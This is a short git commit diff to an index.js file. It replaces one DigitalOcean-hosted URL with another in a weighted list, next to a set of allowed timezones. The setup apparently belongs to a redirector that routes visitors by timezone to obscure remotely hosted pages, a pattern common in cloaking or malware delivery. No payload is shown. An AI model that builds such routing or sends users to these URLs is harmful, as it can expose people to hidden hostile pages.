1fe5392cbe0d8cefb56ad0ff64b598c99b01e84b
paalakash <palaksh452@gmail.com>
2026-07-09 12:26:00 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seal-app-cawd2.ondigitalocean.app/Win0codejInfouycinfcode/index.html", weight: 1.0 }
+    { url: "https://sea-lion-app-xtz8x.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
